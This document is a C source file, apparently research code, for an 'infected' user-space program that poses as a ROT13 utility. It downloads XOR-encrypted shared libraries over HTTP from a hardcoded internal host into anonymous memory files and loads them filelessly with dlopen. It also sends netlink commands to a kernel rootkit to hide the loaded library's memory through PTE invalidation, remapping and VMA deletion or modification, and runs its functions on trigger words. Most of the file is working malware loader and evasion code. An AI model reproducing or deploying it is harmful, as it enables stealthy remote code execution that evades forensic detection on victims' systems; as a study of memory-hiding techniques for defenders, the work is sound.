/* norm-proc.c -- infected user space program to demonstrate VMA/PTE hiding
 *
 * Copyright (C) 2019 Patrick Reichenberger
 *
 * This program is free software; you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation; either version 2 of the License, or
 * (at your option) any later version.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with this program; if not, write to the Free Software
 * Foundation, Inc., 59 Temple Place, Suite 330, Boston, MA 02111-1307 USA
 */
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>

#include <asm/types.h>
#include <sys/socket.h>
#include <linux/netlink.h>

#include <sys/mman.h>
#include <dlfcn.h>
#include <fcntl.h>
#include <linux/memfd.h>
#include <sys/syscall.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <errno.h>

#include <signal.h>
#include <curl/curl.h>

#define NETLINK_USER 31
#define MAX_PAYLOAD 1024

/* Default is the automatic mode. If MANUAL_MODE is defined, the operating mode is the manual mode.
 * This MUST match with the rootkit's operating mode.
 * For automatic mode, comment out the line. */
//#define MANUAL_MODE

/* Define the address to download malicious library and benign library */
#define MAL_URL "http://192.168.15.5:4443/xor-mallib.so"
#define BEN_URL "http://192.168.15.5:4443/xor-benignlib.so"

int file_size;
short hiding_enabled = 0;
#ifdef MANUAL_MODE
char hiding_cmd[128];
char reveal_cmd[128];
#endif
/* Global file descriptors and define name of malicious/benign library */
int malfd;
char *mallib_name = "mal_dynlib";
int benfd;
char *benlib_name = "ben_dynlib";

/* Wrapper for the memfd_create system call */
static inline int memfd_create(const char *name, unsigned int flags) {
    return syscall(__NR_memfd_create, name, flags);
}

/* Decryption function that contains the one bye XOR key */
void xor(char *plain, size_t size) {
    int key = 0x1a;
    for (int i = 0; i < size; ++i) {
        if (plain[i] != 0x00 && plain[i] != key) {
            plain[i] ^= key;
        }
    }
}

/** write_data - callback for curl write
 *  @ptr: pointer to data
 *  @size: size of element
 *  @nmemb: number of elements (size per element is @size)
 *  @mem_fd: memory file descriptor
 */
size_t write_data (void *ptr, size_t size, size_t nmemb, int mem_fd) {
    /* Decrypt the data */
    xor(ptr, nmemb);
    if (write(mem_fd, ptr, nmemb) < 0) {
        close(mem_fd);
        exit(-1);
    }
}

// Download our share object from a C&C via HTTPs (https://x-c3ll.github.io/posts/fileless-memfd_create/)
/** download_to_RAM - download library file and store in memory file
 *  @download: download URL of file
 *  @libname: name of memory file
 *
 *  Download the file from the specified URL and create a memory file where to store the content in.
 *  Could be done via HTTPS, but for testing HTTP is enough.
 *
 *  This function is based on the code of: Juan Manuel Fernández
 *  (see: https://x-c3ll.github.io/posts/fileless-memfd_create/ )
 */
int download_to_RAM(char *url, char* libname) {
    CURL *curl;
    CURLcode res;

    /* Create memory file with name specified in parameter libname */
    int mem_fd = memfd_create(libname, MFD_CLOEXEC);
    if (mem_fd < 0) {
        fprintf(stderr, "Failed to open file descriptor\n");
        exit(-1);
    }

    /* Download the file and write it to memory file */
    curl = curl_easy_init();
    if (curl) {
        curl_easy_setopt(curl, CURLOPT_URL, url);
//        curl_easy_setopt(curl, CURLOPT_SSL_VERIFYPEER, 0L); // Can be used for HTTPS
//        curl_easy_setopt(curl, CURLOPT_SSL_VERIFYHOST, 0L); // Can be used for HTTPS
        curl_easy_setopt(curl, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36");
        curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, write_data); // Callback
        curl_easy_setopt(curl, CURLOPT_WRITEDATA, mem_fd); // Arguments for callback

        res = curl_easy_perform(curl);
        if (res != CURLE_OK && res != CURLE_WRITE_ERROR) {
            close(mem_fd);
            exit(-1);
        }
        curl_easy_cleanup(curl);
        return mem_fd;
    }
}

/** load_lib - load the library from file descriptor
 *  @fd: file descriptor
 *
 *  Dynamically load the file specified in the file descriptor.
 *
 *  This function is based on the code of: Juan Manuel Fernández
 *  (see: https://x-c3ll.github.io/posts/fileless-memfd_create/ )
 */
void *load_lib(int fd) {
    /* Write the path of the file descriptor in the path variable
     * This is needed to call dlopen, which opens the file in memory as a dynamic library.
     */
    char path[128];
    snprintf(path, 128, "/proc/%d/fd/%d", getpid(), fd);

    /* Load library and resolve all symbols */
    void *handle = dlopen(path, RTLD_NOW);
    if (!handle) {
        fprintf(stderr, "Error in dlopen: %s\n", dlerror());
    }
    return handle;
}

/** install_lib - wrapper for installing library
 *  @url: url to download library from
 *  @libname: name of memory file
 *
 */
void *install_lib(char* url, char* libname) {
    void *handle;

    if(!malfd) {
        malfd = download_to_RAM(url, libname);
        handle = load_lib(malfd);
    } else {
        benfd = download_to_RAM(url, libname);
        handle = load_lib(benfd);
    }
    return handle;
}

/** send_message_to_kernel - send netlink message to kernel
 *
 *  @param msg_content
 *
 *  This function is based on the code of: Adnan Waheed
 *  https://stackoverflow.com/a/3334782
 */
int send_message_to_kernel(void *msg_content) {
    struct nlmsghdr *nlh = NULL;
    struct sockaddr_nl src_addr, dest_addr;
    int nl_sockfd;
    struct msghdr msgh;
    struct iovec iov;

    if (strlen(msg_content) > 1024) {
        fprintf(stderr, "Message size too big (> 1024)");
        return 0;
    }
    /* Create netlink socket with user-mode socket protocol family */
    nl_sockfd = socket(AF_NETLINK, SOCK_RAW, NETLINK_USER);
    if(nl_sockfd < 0) {
        fprintf(stderr, "Failed to create netlink socket\n");
        return 0;
    }

    /* Set the entries in src_addr to 0 */
    memset(&src_addr, 0, sizeof(src_addr));
    src_addr.nl_family = AF_NETLINK;
    src_addr.nl_pid = getpid();

    /* Bind the socket to the source address */
    bind(nl_sockfd, (struct sockaddr *) &src_addr, sizeof(src_addr));

    /* Set the entries in dest_addr to 0 */
    memset(&dest_addr, 0, sizeof(dest_addr));
    dest_addr.nl_family = AF_NETLINK;
    dest_addr.nl_pid = 0; // 0 means kernel
    dest_addr.nl_groups = 0; // Only unicast messages, no multicast

    /* Build the netlink header */
    nlh = (struct nlmsghdr *) malloc(NLMSG_SPACE(MAX_PAYLOAD));
    /* Set the entries in the header to 0 */
    memset(nlh, 0, NLMSG_SPACE(MAX_PAYLOAD));
    nlh->nlmsg_len = NLMSG_LENGTH(MAX_PAYLOAD);
    nlh->nlmsg_pid = getpid();
    nlh->nlmsg_flags = 0;

    /* Add the payload */
    strcpy(NLMSG_DATA(nlh), msg_content);

    /* For datagram sockets, sendmsg() needs to be used, which takes a msghdr as parameter.
     * msghdr needs iov. These is a pointer to an array of iovec structures which consist of
     * a base address and a length and allows to transfer scattered data.
     * So first, set up one iovec structure pointing to the netlink message. */
    iov.iov_base = (void *)nlh;
    iov.iov_len = nlh->nlmsg_len;
    /* Set up the msghdr by specifying the destination address and the iovec structures (content) */
    memset(&msgh, 0, sizeof(struct msghdr));
    msgh.msg_name = (void *) &dest_addr;
    msgh.msg_namelen = sizeof(dest_addr);
    msgh.msg_iov = &iov;
    msgh.msg_iovlen = 1;

    printf("Send a message to the kernel\n");
    /* Send the message to the kernel */
    if(sendmsg(nl_sockfd, &msgh, 0), NLMSG_DATA(nlh) < 0) {
        printf("Error in sending message: %s", strerror(errno));
    } else {
        printf("Successfully sent.\n");
    }

    /* Optional, receive message from kernel, can be used as acknowledgement */
    //memset(nlh, 0, NLMSG_SPACE(MAX_PAYLOAD));
    //recvmsg(nl_sockfd, &msgh, 0);
    //printf("Received message from kernel: %s\n", NLMSG_DATA(nlh));

    close(nl_sockfd);
    free(nlh);
	return 1;
    //return NLMSG_DATA(nlh);
}

/** build_cmd - builds command which is sent to the rootkit
 *  @technique: specify technique to used
 *  @mallib_path: name of malicious library (memfd name) to hide
 *  @benlib_path: name of benign library (memfd name) if necessary, otherwise 0
 * 
 *  Create the command the rootkit is able to parse. Return a pointer to the allocated string region.
 */
char *build_cmd(char *technique, char *mallib_path, char *benlib_path) {
    int size;
    char *cmd;
    if(benlib_path) {
        size = strlen(technique) + strlen(mallib_path) + strlen(benlib_path) + 8;
        cmd = (char *) malloc(size * sizeof(char));

        snprintf(cmd, size, "%s \"%s\" \"%s\"", technique, mallib_path, benlib_path);
    } else {
        size = strlen(technique) + strlen(mallib_path) + 5;
        cmd = (char *) malloc(size * sizeof(char));
        snprintf(cmd, size, "%s \"%s\"", technique, mallib_path);
    }
    return cmd;
}


/** pte_invalidate_restore - manages pte invalidate/restore technique
 * 
 *  First the malicious library is installed, i.e. downloaded and loaded as dynamic library from memory file.
 *  The command to hide the malicious library data by invalidating its PTEs is sent to the rootkit.
 */
void *pte_invalidate_restore() {
    void *mal_handle;
    int response_stat;
    
    /* Get the mal_handle to the loaded library (the malicious code) */
    mal_handle = install_lib(MAL_URL, mallib_name);
    if(malfd)
        close(malfd);
    /* Send the signal to the rootkit to hide the pages of the malicious library */
    char *cmd = build_cmd("pteinvalidate", mallib_name, NULL);
    #ifdef MANUAL_MODE
    /* In manual mode, store the command in a global variable in order not to build it each time */
    strcpy(hiding_cmd, cmd);
    #endif
    
    /* Sends the hiding command to the rootkit */
    response_stat = send_message_to_kernel(cmd);
    free(cmd);
    if(!response_stat) {
        fprintf(stderr, "Aborting, error in sending message to kernel\n");
        return 0;
    }

    #ifdef MANUAL_MODE
    /* In manual mode, build and store the command in a global variable in order not to build it 
     * each time when the data is to be restored. */
    cmd = build_cmd("pterestore", mallib_name, NULL);
    if(cmd) {
        strcpy(reveal_cmd, cmd);
        free(cmd);
    }
    #endif

    return mal_handle;
}

/** pte_remap_reset - manages pte remap/reset technique
 * 
 *  First the malicious library is installed, i.e. downloaded and loaded as dynamic library from memory file.
 *  The command to hide the malicious library data by remapping its PTEs is sent to the rootkit.
 */
void *pte_remap_reset() {
    void *mal_handle;
    int response_stat;

    /* Get the mal_handle to the loaded library (the malicious code) */
    mal_handle = install_lib(MAL_URL, mallib_name);
    if(malfd)
        close(malfd);

    /* Send the signal to the rootkit to remap the pages the malicious library to page frames of the init process */
    char *cmd = build_cmd("pteremap", mallib_name, NULL);
    #ifdef MANUAL_MODE
    /* In manual mode, store the command in a global variable in order not to build it each time */
    strcpy(hiding_cmd, cmd);
    #endif

    response_stat = send_message_to_kernel(cmd);
    free(cmd);
    if(!response_stat) {
        fprintf(stderr, "Aborting, error in sending message to kernel\n");
        return 0;
    }

    #ifdef MANUAL_MODE
    /* In manual mode, build and store the command in a global variable in order not to build it
     * each time when the data is to be restored. */
    cmd = build_cmd("ptereset", mallib_name, NULL);
    if(cmd) {
        strcpy(reveal_cmd, cmd);
        free(cmd);
    }
    #endif

    return mal_handle;
}

/** vma_delete - manages vma delete/restore technique
 * 
 *  First the malicious library is installed, i.e. downloaded and loaded as dynamic library from memory file.
 *  The command to hide the malicious library data by deleting its VMAs is sent to the rootkit.
 */
void *vma_delete() {
    void *mal_handle;
    int response_stat;

    /* Get the mal_handle to the loaded library (the malicious code) */
    mal_handle = install_lib(MAL_URL, mallib_name);
    if(malfd)
        close(malfd);

    /* Send the signal to the rootkit to delete the VMAs of the malicious library */
    char *cmd = build_cmd("vmadelete", mallib_name, NULL);
    #ifdef MANUAL_MODE
    strcpy(hiding_cmd, cmd);
    #endif

    response_stat = send_message_to_kernel(cmd);
    free(cmd);
    if(!response_stat) {
        fprintf(stderr, "Aborting, error in sending message to kernel\n");
        return 0;
    }

    #ifdef MANUAL_MODE
    /* In manual mode, build and store the command in a global variable in order not to build it
     * each time when the data is to be restored. */
    cmd = build_cmd("vmarestore", mallib_name, NULL);
    if(cmd) {
        strcpy(reveal_cmd, cmd);
        free(cmd);
    }
    #endif

    return mal_handle;
}

/** vma_delete - manages vma delete/restore technique
 * 
 *  First the malicious library is installed, i.e. downloaded and loaded as dynamic library from memory file.
 *  The command to hide the malicious library data by deleting its VMAs is sent to the rootkit.
 */
void *vma_modify() {
    void *mal_handle;
    void *benign_handle;
    int response_stat;

    /* Get the mal_handle to the loaded library (the malicious code) */
    mal_handle = install_lib(MAL_URL, mallib_name);
    /* Get the benign_handle to the loaded library (the benign code) */
    benign_handle = install_lib(BEN_URL, benlib_name);
    if(malfd)
        close(malfd);
    if(benfd)
        close(benfd);

    /* Send the signal to the rootkit to modify the limits of the VMAs of the malicious library to the
     * limits of the VMAs of the benign library specified. */
    char *cmd = build_cmd("vmamodify", mallib_name, benlib_name);
    #ifdef MANUAL_MODE
    strcpy(hiding_cmd, cmd);
    #endif

    response_stat = send_message_to_kernel(cmd);
    free(cmd);
    if(!response_stat) {
        fprintf(stderr, "Aborting, error in sending message to kernel\n");
        return 0;
    }

    #ifdef MANUAL_MODE
    /* In manual mode, build and store the command in a global variable in order not to build it
     * each time when the data is to be restored. */
    cmd = build_cmd("vmareset", mallib_name, NULL);
    if(cmd) {
        strcpy(reveal_cmd, cmd);
        free(cmd);
    }
    #endif

    return mal_handle;
}

/** pte_vma_delete - manages vma delete/restore technique
 *
 *  First the malicious library is installed, i.e. downloaded and loaded as dynamic library from memory file.
 *  The command to hide the malicious library data by deleting its VMAs is sent to the rootkit.
 */
void *pte_vma_delete() {
    void *mal_handle;
    int response_stat;

    /* Get the mal_handle to the loaded library (the malicious code) */
    mal_handle = install_lib(MAL_URL, mallib_name);
    if(malfd)
        close(malfd);

    /* Send the signal to the rootkit to delete the VMAs of the malicious library */
    char *cmd = build_cmd("ptevmadelete", mallib_name, NULL);
#ifdef MANUAL_MODE
    strcpy(hiding_cmd, cmd);
#endif

    response_stat = send_message_to_kernel(cmd);
    free(cmd);
    if(!response_stat) {
        fprintf(stderr, "Aborting, error in sending message to kernel\n");
        return 0;
    }

#ifdef MANUAL_MODE
    /* In manual mode, build and store the command in a global variable in order not to build it
     * each time when the data is to be restored. */
    cmd = build_cmd("ptevmarestore", mallib_name, NULL);
    if(cmd) {
        strcpy(reveal_cmd, cmd);
        free(cmd);
    }
#endif

    return mal_handle;
}


#ifdef MANUAL_MODE
/** reveal_data - sends command to rootkit to reveal data in manual mode
 *
 *  This function is called when the manual mode is active and a malicious action should be executed.
 *  Before running the malicous actions, the data needs to be revealed, which is done with this function.
 *  The command is initialized in the global variable when the initial message to hide the data is sent to the rootkit.
 */
int reveal_data(void) {
    if(hiding_enabled) {
        int response_stat = send_message_to_kernel(reveal_cmd);
        if(!response_stat) {
            fprintf(stderr, "Aborting, error in sending message to kernel\n");
            return -1;
        }
        return 0;
    }
}

/** hide_data - sends command to hide data in manual mode
 *
 *  This function is called when the manual mode is active and a malicious action should be hidden again.
 *  After running the malicous actions, the data needs to be hidden again, which is done with this function.
 *  The command is initialized in the global variable when the initial message to hide the data is sent to the rootkit.
 */
int hide_data(void) {
    if(hiding_enabled) {
        int response_stat = send_message_to_kernel(hiding_cmd);
        if(!response_stat) {
            fprintf(stderr, "Aborting, error in sending message to kernel\n");
            return -1;
        }
        return 0;
    }
}
#endif

int main() {
    void *mal_handle;
    char string[100];

    while(1) {
        printf("Enter some string (<100 chars, a-z, A-Z): ");
        scanf("%s", string);
        int e;

        if(strlen(string) >= 100) {
            return -1;
        }
        /* The initial triggers that download the library and hides it.
         * After initialized, hiding_enabled bit is set to prevent sending the message again */
        if(!hiding_enabled) {
            if(!strcmp(string, "load_pteinvalidate")) {
                /* Invalidate/restore PTEs */
                if(!(mal_handle = pte_invalidate_restore())) {
                    return -1;
                }
                hiding_enabled = 1;
            } else if (!strcmp(string, "load_pteremap")) {
                /* Remap/reset PTEs */
                if(!(mal_handle = pte_remap_reset())) {
                    return -1;
                }
                hiding_enabled = 1;
            } else if (!strcmp(string, "load_vmadelete")) {
                /* Delete/Restore VMAs */
                if(!(mal_handle = vma_delete())) {
                    return -1;
                }
                hiding_enabled = 1;
            } else if (!strcmp(string, "load_vmamodify")) {
                /* Modify/reset VMAs */
                if(!(mal_handle = vma_modify())) {
                    return -1;
                }
                hiding_enabled = 1;
            } else if (!strcmp(string, "load_ptevmadelete")) {
                /* Modify/reset VMAs */
                if(!(mal_handle = pte_vma_delete())) {
                    return -1;
                }
                hiding_enabled = 1;
            }
        }

        /* These to keywords should represent triggering malicious actions on certain events. In this case
         * the events are keywords */
        if (!strcmp(string, "run_malprint1")) {
            if(mal_handle) {
                #ifdef MANUAL_MODE
                reveal_data();
                #endif
                void (*malicious_print)(void);
                /* Obtain the address of the function from the malicious library */
                *(void **)(&malicious_print) = dlsym(mal_handle, "malicious_print");
                (*malicious_print)();
                #ifdef MANUAL_MODE
                hide_data();
                #endif
            }
        } else if (!strcmp(string, "run_malprint2")) {
            /* Obtain the address of the second function from the malicious library */
            if(mal_handle) {
                #ifdef MANUAL_MODE
                reveal_data();
                #endif
                void (*malicious_print2)(void);
                *(void **) (&malicious_print2) = dlsym(mal_handle, "malicious_print2");
                (*malicious_print2)();
                #ifdef MANUAL_MODE
                hide_data();
                #endif
            }
        }

        /* Do ROT13 for input */
        for(int i = 0; i < strlen(string); ++i) {
            int c = (int) string[i];
            if(c >= 'A' && c <= 'Z') {
                if((e = c + 13) <= 'Z') {
                    string[i] = (char) e;
                } else {
                    string[i] = (char) c - 13;
                }
            } else if(c >= 'a' && c <= 'z') {
                if((e = c + 13) <= 'z') {
                    string[i] = (char) e;
                } else {
                    string[i] = (char) c - 13;
                }
            }
        }
        printf( "\nThat is in ROT13: ");
        puts( string );

    }
}
